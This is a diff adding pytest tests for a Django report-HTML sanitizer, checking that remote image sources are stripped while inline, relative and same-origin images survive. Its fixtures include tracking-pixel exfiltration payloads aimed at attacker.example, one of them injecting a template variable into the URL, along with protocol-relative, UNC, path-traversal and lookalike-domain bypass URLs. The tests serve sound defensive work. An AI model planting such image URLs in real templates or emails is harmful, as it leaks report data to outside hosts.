@@ -6,7 +6,7 @@ from unittest.mock import patch
 
 import pytest
 from django.core.mail import EmailMessage
-from django.test import RequestFactory, SimpleTestCase
+from django.test import RequestFactory, SimpleTestCase, override_settings
 from jinja2.exceptions import SecurityError, TemplateError
 
 from core.reports.rendering import (
@@ -166,8 +166,9 @@ PNG = "data:image/png;base64,iVBORw0KGgo="
         '<a href="tel:+491234">l</a>',
         '<a href="/relative/path">l</a>',
         '<a href="#anchor">l</a>',
-        '<img src="https://example.com/i.png" alt="i" width="3" height="4">',
-        '<img src="/static/i.png">',
+        '<img src="/static/i.png" alt="i" width="3" height="4">',
+        '<img src="/media/logo.png">',
+        '<img src="media/logo.png">',
         '<img src="%s">' % PNG,
         '<table><tr><td colspan="2">c</td></tr></table>',
         '<p class="x" title="t" lang="de" dir="ltr" aria-label="a">p</p>',
@@ -375,3 +376,54 @@ def test_normal_loop_table_with_small_repetition_renders():
         {"headers": ["A", "B"]},
     )
     assert "<td>A</td>" in out and "<td>B</td>" in out and "-" * 20 + "1024" in out
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        '<img src="https://attacker.example/p.gif?d=x">',
+        '<img src="http://attacker.example/p.gif">',
+        '<img src="//evil.example/x.png">',
+        r'<img src="\\evil.example\share\x.png">',
+        r'<img src="/static\..\x.png">',
+        '<img src="ftp://evil.example/x.png">',
+    ],
+    ids=["https", "http", "protocol-relative", "unc", "backslash", "ftp"],
+)
+def test_remote_images_are_removed(source):
+    out = sanitize_report_html(source)
+    assert "src=" not in out and "evil" not in out and "attacker" not in out, out
+
+
+def test_raster_data_and_relative_images_are_preserved():
+    for src in (PNG, "/static/logo.png", "/media/logo.png", "media/logo.png"):
+        assert 'src="%s"' % src in sanitize_report_html('<img src="%s">' % src)
+
+
+@override_settings(ITAMBOX_BASE_URL="https://itam.example.com", STATIC_URL="/static/", MEDIA_URL="/media/")
+class OwnOriginImageTests(SimpleTestCase):
+    def test_own_origin_static_and_media_are_kept(self):
+        for src in ("https://itam.example.com/static/logo.png", "https://itam.example.com/media/t/logo.png"):
+            assert 'src="%s"' % src in sanitize_report_html('<img src="%s">' % src)
+
+    def test_external_and_off_prefix_urls_are_removed(self):
+        for src in (
+            "https://attacker.example/static/logo.png",
+            "http://itam.example.com/static/logo.png",
+            "https://itam.example.com/api/assets/",
+            "https://itam.example.com/static/../api/x.png",
+            "https://itam.example.com.evil.example/static/x.png",
+            "https://itam.example.com/static/",
+        ):
+            assert "src=" not in sanitize_report_html('<img src="%s">' % src), src
+
+    @override_settings(ITAMBOX_BASE_URL="")
+    def test_absolute_urls_rejected_without_base_url(self):
+        assert "src=" not in sanitize_report_html('<img src="https://itam.example.com/static/logo.png">')
+
+    def test_mail_body_has_no_external_image(self):
+        template = SimpleNamespace(
+            template_content='<p>x</p><img src="https://attacker.example/p.gif?d={{ report_name }}">'
+        )
+        body = _render_report_html({"report_name": "Quarterly"}, template)
+        assert "attacker.example" not in body and "<img" in body and "src=" not in body
